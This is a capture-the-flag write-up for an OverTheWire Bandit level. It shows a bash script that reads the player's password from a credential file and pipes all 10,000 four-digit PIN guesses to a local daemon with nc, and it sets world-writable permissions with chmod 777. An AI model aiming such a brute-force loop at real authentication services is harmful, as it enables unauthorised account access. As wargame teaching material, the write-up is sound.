## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


## Solution
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
^C
bandit24@bandit:~$ cd `mktemp -d`
bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ vim getpass.sh
bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ chmod 777 getpass.sh
bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ chmod 777 /tmp/tmp.XeNXy1uRbi
bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ ./getpass.sh > answerfile
bandit24@bandit:/tmp/tmp.XeNXy1uRbi$ nc localhost 30002 < answerfile
...
Wrong! Please enter the correct pincode. Try again.

Exiting.

```

Contents of getpass.sh
```bash
#!/bin/bash                           
passwd=$(cat /etc/bandit_pass/bandit24)

for i in {0..9999}; do
  printf "%s %04d\n" "$passwd" "$i"
done
```

## Explanation
This level further explores Bash scripting. This time you need to know how to use a for loop and printf.
